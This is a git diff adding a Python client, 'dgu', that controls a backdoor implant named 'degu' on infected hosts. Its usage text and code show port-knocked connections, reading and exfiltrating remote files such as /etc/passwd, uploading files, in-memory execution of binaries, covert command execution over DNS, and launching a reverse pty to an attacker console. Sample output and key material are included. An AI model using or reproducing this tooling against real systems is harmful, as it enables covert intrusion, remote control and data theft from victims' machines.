@@ -1,0 +1,225 @@
+#!/usr/bin/env python3
+import sys
+import docopt
+import logging
+import time
+from multiprocessing.pool import ThreadPool
+import degu
+
+PRIVATE_KEY=degu.PRIV
+
+__doc__="""
+
+Usage:
+    dgu bind  <rhost> <rport>         read     <rfile>
+    dgu bind  <rhost> <rport>         download <rfile> <lfile>
+    dgu bind  <rhost> <rport>         upload   <lfile> <rfile>
+    dgu bind  <rhost> <rport>         exe      <lfile> <parameters>
+    dgu cb    <rhost> <lhost> <lport> read     <rfile>
+    dgu cb    <rhost> <lhost> <lport> download <rfile> <lfile>
+    dgu cb    <rhost> <lhost> <lport> upload   <lfile> <rfile>
+    dgu cb    <rhost> <lhost> <lport> exe      <lfile> <parameters>
+    dgu ghost <rhost> <cmd>
+    dgu keygen
+    dgu getpub 
+
+Examples:
+
+    Upload local /tmp/dd file to remote /tmp/upped on degu infected
+    host 192.168.0.49, asking him to open 12345 for bind connect :
+
+$ dgu bind 192.168.0.49 12345 upload /tmp/dd /tmp/upped
+[    INFO  14:11.57][degu ]: trying remote bind on 192.168.0.49:12345
+[    INFO  14:11.59][degu ]: uploaded /tmp/dd on 192.168.0.49:12345:/tmp/upped
+
+    Read remote /etc/passwd file, asking degu to wait on port 9991 for connection :
+
+$ dgu bind 192.168.0.49 9991 read /etc/passwd
+[    INFO  14:11.15][degu ]: trying remote bind on 192.168.0.49:9991
+[    INFO  14:11.17][degu ]: downloading b'/etc/passwd'
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+...
+
+    Execute reverse pty on lhost 192.168.0.15:11111 using cb ( don't forget arg0 !)
+on attacker console :
+
+$ dgu bind 192.168.0.49 12311 exe helpers/cb "MYPROC 192.168.0.15 11111"
+[    INFO  14:51.00][degu ]: trying remote bind on 192.168.0.49:12311
+[    INFO  14:51.03][degu ]: send bin ok
+[    INFO  14:51.03][degu ]: launch exe helpers/cb on 192.168.0.49
+
+Execute over unfiltered dns
+
+$ dgu ghost 192.168.0.49 "touch /tmp/pwneeee"
+[    INFO  18:58.45][degu ]: ghost executing b'touch /tmp/pwneeee'
+[   DEBUG  18:58.45][degu ]: executing : b'touch /tmp/pwneeee'
+
+Generate new keys.h
+
+$ ./dgu keygen
+#define IV            { 0x78,0xc5,0x49,0x18,0xa5,0x6f,0x92,0x6a,0x62,0x21,0x47,0x5b,0xf0,0x55,0xa8,0xf0}
+#define KNOCK_KEY     { 0x21,0x5f,0xad,0x87,0xe6,0xc0,0x4e,0x3a,0x3e,0x2b,0x96,0x2b,0x2d,0xb9,0x85,0x09,0xbc,0xf9,0xf2,0xd4,0xaf,0xb0,0xee,0x6b,0x58,0xad,0x75,0xbe,0xd5,0x7a,0xd0,0x39}
+#define MASTER_PUBKEY { 0xc1,0xad,0x6c,0x7e,0xd6,0xe4,0x6c,0x86,0x69,0xfe,0xc2,0x34,0xa7,0x52,0xa0,0xac,0x63,0x01,0xeb,0xc3,0x83,0x70,0x08,0x56,0xbe,0x54,0x30,0x34,0x68,0x69,0xcf,0x54}
+
+// PRIVATE_KEY="2831ff7a13ed00ff1680dcf39dc8669777e269b00862d6160cc4e98ac695276e8c155b1f721e07e400a19b5999e351f0002263d103b3cffebf7feb8c72974897"
+
+Recover pub key from private key
+
+$ ./dgu getpub 2831ff7a13ed00ff1680dcf39dc8669777e269b00862d6160cc4e98ac695276e8c155b1f721e07e400a19b5999e351f0002263d103b3cffebf7feb8c72974897
+#define MASTER_PUBKEY {0xc1,0xad,0x6c,0x7e,0xd6,0xe4,0x6c,0x86,0x69,0xfe,0xc2,0x34,0xa7,0x52,0xa0,0xac,0x63,0x01,0xeb,0xc3,0x83,0x70,0x08,0x56,0xbe,0x54,0x30,0x34,0x68,0x69,0xcf,0x54}; 
+// pub= c1ad6c7ed6e46c8669fec234a752a0ac6301ebc383700856be5430346869cf54
+
+"""
+
+
+class LogFmt(logging.Formatter):
+    """ class for log formating """
+
+    def __init__(self):
+        logging.Formatter.__init__(self)
+
+    def format_time(self):
+        """ format time """
+        return time.strftime("%H:%M.%S")
+
+    def _l(self,level):
+        clevel = {"DEBUG"    :  ("\033[0;36m","\033[1;36m"),
+          "INFO"     :  ("\033[0;37m","\033[1;37m"),
+          "WARNING"  :  ("\033[0;31m","\033[1;31m"),
+          "CRITICAL" :  ("\033[0;31m","\033[1;31m"),
+          "ERROR"    :  ("\033[0;31m","\033[1;31m"),
+          }
+        return clevel[level]
+
+    def format(self,record):
+        header = self._l(record.levelname)[0] + "[" + self._l(record.levelname)[1] + "%8s"%record.levelname \
+               + self._l(record.levelname)[1] + "  " + self.format_time() + "][%-5s]: " % record.name + "\033[0m"
+        return header + "\033[0m" + record.msg
+
+LEVEL = logging.DEBUG
+log = logging.getLogger('degu')
+log.setLevel(LEVEL)
+ch = logging.StreamHandler()
+ch.setFormatter(LogFmt())
+log.addHandler(ch)
+
+if __name__ == "__main__":
+    args = docopt.docopt(__doc__)
+
+    if args['read'] or args['download']:
+        if args['bind']:
+            d = degu.degu(args['<rhost>'],priv = PRIVATE_KEY)
+            if not d.knock( ':' + args['<rport>']):
+                log.error("knock failed")
+                sys.exit()
+            time.sleep(2) # waiting for port to come up on degu
+            fil = d.download(args['<rfile>'])
+            if not fil:
+                log.error("no content downloaded")
+                sys.exit()
+
+            if args['read']:
+                if fil:
+                    print(fil.decode("ascii"))
+            else:
+                try:
+                    f = open(args['<lfile>'],"wb")
+                    f.write(fil)
+                    f.close()
+                    d.log.info("write %i bytes on %s "%(len(fil),args['<lfile>']))
+                except Exception as e:
+                    d.log.error("unable to create %s : %s" % (args['<lfile>'],e))
+            del d
+        if args['cb']:
+            d = degu.degu(args['<rhost>'],priv = PRIVATE_KEY)
+            pool = ThreadPool(processes=1)
+            async_result = pool.apply_async(d.rdownload, (args['<rfile>'],args['<lport>']))
+            
+            if not d.knock( '%s:%s' % ( args['<lhost>'] , args['<lport>'])):
+                log.error("knock failed")
+                sys.exit()
+
+            fil = None
+            try:
+                fil = async_result.get()
+            except TimeoutError as e:
+                log.error(f"timeout reached : {e}")
+            if fil :
+                if args['read']:
+                    print(fil.decode("ascii"))
+                else:
+                    try:
+                        f = open(args['<lfile>'],"wb")
+                        f.write(fil)
+                        f.close()
+                        d.log.info("write %i bytes on %s "%(len(fil),args['<lfile>']))
+                    except Exception as e:
+                        d.log.error("unable to create %s : %s" % (args['<lfile>'],e))
+            del d
+
+    if args['upload']:
+        if args['bind']:
+            d = degu.degu(args['<rhost>'],priv = PRIVATE_KEY)
+            if not d.knock( ':' + args['<rport>']):
+                log.error("knock failed")
+                sys.exit()
+            time.sleep(2) # waiting for port to come up on degu
+            try:
+                fil = d.upload( args['<lfile>'], args['<rfile>'] )
+                d.log.info("uploaded %s on %s:%s"%(args['<lfile>'],args['<rhost>'],args['<rfile>']))
+            except Exception as e:
+                d.log.error("unable to upload %s : %s" % (args['<lfile>'],e))
+
+        if args['cb']:
+            d = degu.degu(args['<rhost>'],priv = PRIVATE_KEY)
+            pool = ThreadPool(processes=1)
+            async_result = pool.apply_async(d.rupload, (args['<lfile>'], args['<rfile>'],args['<lport>']))
+            if not d.knock( '%s:%s' % ( args['<lhost>'] , args['<lport>'])):
+                log.error("knock failed")
+                sys.exit()
+            
+            a = None
+            try:
+                a = async_result.get()
+                d.log.info("uploaded %s on %s:%s"%(args['<lfile>'],args['<rhost>'],args['<rfile>']))
+            except TimeoutError as e:
+                log.error(f"timeout reached : {e}")
+
+    if args['exe']:
+        if args['bind']:
+            d = degu.degu(args['<rhost>'],priv = PRIVATE_KEY)
+            if not d.knock( ':' + args['<rport>']):
+                log.error("knock failed")
+                sys.exit()
+            time.sleep(2) # waiting for port to come up on degu
+            try:
+                d.mem_exec(args['<lfile>'],args['<parameters>'])
+                d.log.info("launch exe %s on %s"%(args['<lfile>'],args['<rhost>']))
+            except Exception as e:
+                d.log.error("unable to upload %s : %s" % (args['<lfile>'],e))
+            del d
+        if args["cb"]:
+            d = degu.degu(args['<rhost>'],priv = PRIVATE_KEY)
+            pool = ThreadPool(processes=1)
+            async_result = pool.apply_async(d.rmem_exec, (args['<lfile>'],args['<parameters>'],args['<lport>']))
+            if not d.knock( '%s:%s' % ( args['<lhost>'] , args['<lport>'])):
+                log.error("knock failed")
+                sys.exit()
+            a = None
+            try:
+                a = async_result.get()
+            except TimeoutError as e:
+                log.error(f"timeout reached : {e}")
+            if a :
+                print(a.decode("ascii"))
+
+    if args['ghost']:
+        d = degu.degu(args['<rhost>'],priv = PRIVATE_KEY)
+        d.ghost_exec(args['<cmd>'])
+
+    if args['keygen']:
+        print(degu.degu.keygen())
+
+    if args['getpub']:
+        degu.degu.getpub()
